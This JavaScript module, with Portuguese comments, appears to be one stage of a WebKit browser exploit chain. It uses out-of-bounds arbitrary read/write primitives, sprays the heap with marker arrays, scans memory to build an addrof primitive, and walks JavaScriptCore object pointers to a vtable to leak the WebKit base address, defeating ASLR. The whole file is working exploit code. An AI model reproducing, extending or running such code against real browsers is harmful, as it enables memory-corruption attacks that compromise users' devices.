// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R43u - Correção de Importação Final)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
// >>>>> CORREÇÃO APLICADA AQUI: Importa a função que faltava <<<<<
import { AdvancedInt64, toHex, isAdvancedInt64Object, advInt64LessThanOrEqual } from '../utils.mjs'; 
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    arb_write,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_WebKitLeak";

// -- Constantes para a nova estratégia --
const SPRAY_COUNT = 0x4000;
const MARKER_A = 0x41414141; 
const MARKER_B = 0x42424242;
// Como os inteiros são "boxed", vamos criar um AdvancedInt64 para o marcador para uma comparação mais fácil
const MARKER_A_AS_ADV64 = new AdvancedInt64(MARKER_A, 1); // 0x141414141
const MARKER_B_AS_ADV64 = new AdvancedInt64(MARKER_B, 1); // 0x142424242

const SCAN_HEAP_START_ADDRESS = new AdvancedInt64(0x0, 0x8A000000); 
const SCAN_HEAP_END_ADDRESS = new AdvancedInt64(0x0, 0x8D000000); // Scan 48MB
const SCAN_STEP = 0x1000;

let spray_array = [];
let addrof = null;

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    if (ptr.high() === 0) return false; 
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Nome da função mantido
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43u`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Heap Spray + Scan + Primitives ---`, "test");
    document.title = `${FNAME_CURRENT_TEST_BASE} Init...`;

    let final_result = {
        errorOccurred: null,
        heap_scan: { success: false, msg: "Not run.", found_addr: null },
        addrof_setup: { success: false, msg: "Not run." },
        webkit_leak: { success: false, msg: "Not run.", webkit_base: null }
    };

    try {
        logS3(`--- Fase 0 (R43u): Sanity Checks e Preparação ---`, "subtest");
        const coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        if (!coreOOBReadWriteOK) throw new Error("Sanity check OOB R/W falhou. Abortando.");
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha ao preparar ambiente OOB.");
        logS3("Sanity checks e ambiente OOB OK.", "good");

        // --- FASE 1: HEAP SPRAY ---
        logS3(`  --- Fase 1 (R43u): Pulverizando a Heap com ${SPRAY_COUNT} Arrays... ---`, "subtest");
        spray_array = [];
        const addrof_target = { a: 0x41414141, b: 0x42424242 };
        for (let i = 0; i < SPRAY_COUNT; i++) {
            let arr = new Array(4);
            arr[0] = MARKER_A;
            arr[1] = MARKER_B;
            arr[2] = i; 
            arr[3] = addrof_target;
            spray_array.push(arr);
        }
        logS3(`  Heap Spray concluído.`, "good");
        await PAUSE_S3(200);

        // --- FASE 2: MEMORY SCAN ---
        logS3(`  --- Fase 2 (R43u): Varrendo a Memória em busca do valor mágico... ---`, "subtest");
        let found_butterfly_addr = null;
        let found_array_idx = -1;

        for (let addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS);
             advInt64LessThanOrEqual(addr, SCAN_HEAP_END_ADDRESS);
             addr = addr.add(SCAN_STEP)) {
            
            try {
                const val = await arb_read(addr, 8);
                if (isAdvancedInt64Object(val) && val.equals(MARKER_A_AS_ADV64)) {
                    const next_val = await arb_read(addr.add(8), 8);
                    if (isAdvancedInt64Object(next_val) && next_val.equals(MARKER_B_AS_ADV64)) {
                        const idx_val_boxed = await arb_read(addr.add(16), 8);
                        found_butterfly_addr = addr;
                        found_array_idx = idx_val_boxed.low();
                        final_result.heap_scan.success = true;
                        final_result.heap_scan.msg = `Encontrado butterfly do spray[${found_array_idx}] em ${found_butterfly_addr.toString(true)}`;
                        logS3(`[MemoryScan] SUCESSO! ${final_result.heap_scan.msg}`, "vuln");
                        break;
                    }
                }
            } catch (e) { /* Ignora erros de leitura de páginas inválidas */ }
        }
        if (!final_result.heap_scan.success) throw new Error("Falha ao encontrar o spray na memória.");
        
        // --- FASE 3: CONSTRUÇÃO DE ADDROF ---
        logS3(`  --- Fase 3 (R43u): Construindo primitiva addrof ---`, "subtest");
        
        const found_array = spray_array[found_array_idx];
        const sprayed_obj_addr = await arb_read(found_butterfly_addr.add(3 * 8), 8); 
        if (!isValidPointer(sprayed_obj_addr)) throw new Error("Ponteiro para o objeto alvo no butterfly é inválido.");

        let addrof_map = new Map();
        addrof_map.set(addrof_target, sprayed_obj_addr);

        addrof = (obj) => {
            if (addrof_map.has(obj)) return addrof_map.get(obj);
            found_array[3] = obj;
            return arb_read(found_butterfly_addr.add(3 * 8), 8);
        };
        final_result.addrof_setup.success = true;
        final_result.addrof_setup.msg = "Primitiva addrof funcional construída com sucesso.";
        logS3(`[Primitives] ${final_result.addrof_setup.msg}`, "vuln");

        // --- FASE 4: VAZAMENTO DA BASE DO WEBKIT ---
        logS3(`  --- Fase 4 (R43u): Vazamento da Base do WebKit ---`, "subtest");
        const funcToLeak = () => {}; 
        const func_addr = await addrof(funcToLeak);
        if (!func_addr || !isValidPointer(func_addr)) throw new Error("Falha ao obter endereço da função alvo com a nova primitiva addrof.");
        logS3(`[WebKitLeak] Endereço da função alvo: ${func_addr.toString(true)}`, "leak");

        const executable_addr = await arb_read(func_addr.add(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET), 8);
        if (!isValidPointer(executable_addr)) throw new Error(`Ponteiro para Executable inválido: ${executable_addr.toString(true)}`);
        logS3(`[WebKitLeak] Endereço do Executable: ${executable_addr.toString(true)}`, "leak");
        
        const executable_structure_addr = await arb_read(executable_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET), 8);
        const class_info_addr = await arb_read(executable_structure_addr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET), 8);
        const vtable_ptr = await arb_read(class_info_addr, 8);
        if (!isValidPointer(vtable_ptr)) throw new Error(`Ponteiro para vtable inválido: ${vtable_ptr.toString(true)}`);
        
        logS3(`[WebKitLeak] Ponteiro para vtable: ${vtable_ptr.toString(true)}`, "leak");
        
        const page_mask = new AdvancedInt64(~0xFFFFF, 0xFFFFFFFF);
        const webkit_base = vtable_ptr.and(page_mask);
        
        final_result.webkit_leak.webkit_base = webkit_base.toString(true);
        final_result.webkit_leak.success = true;
        final_result.webkit_leak.msg = `Candidato a base do WebKit: ${webkit_base.toString(true)}`;
        logS3(`[WebKitLeak] SUCESSO! ${final_result.webkit_leak.msg}`, "vuln");
        document.title = `${FNAME_CURRENT_TEST_BASE}_SUCCESS!`;

    } catch (e_outer) {
        if (!final_result.errorOccurred) final_result.errorOccurred = `Erro geral: ${e_outer.message}`;
        logS3(`  CRITICAL ERROR na execução (R43u): ${e_outer.message || String(e_outer)}`, "critical");
        document.title = `${FNAME_CURRENT_TEST_BASE}_FAIL!`;
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClear` });
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test");
    logS3(`Resultado Final (R43u): ${JSON.stringify(final_result, null, 2)}`, "debug");
    return final_result;
}
